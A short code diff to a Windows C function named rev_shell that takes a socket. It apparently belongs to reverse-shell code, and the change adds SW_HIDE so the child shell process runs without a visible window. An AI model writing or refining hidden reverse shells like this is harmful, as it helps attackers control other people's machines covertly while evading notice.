@@ -246,7 +246,8 @@ void rev_shell(SOCKET clientSocket)
 
     STARTUPINFOW si = {0};
     si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESTDHANDLES;
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
     si.hStdOutput = hChildStdOutWrite;
     si.hStdError = hChildStdOutWrite;
     si.hStdInput = hChildStdInRead;
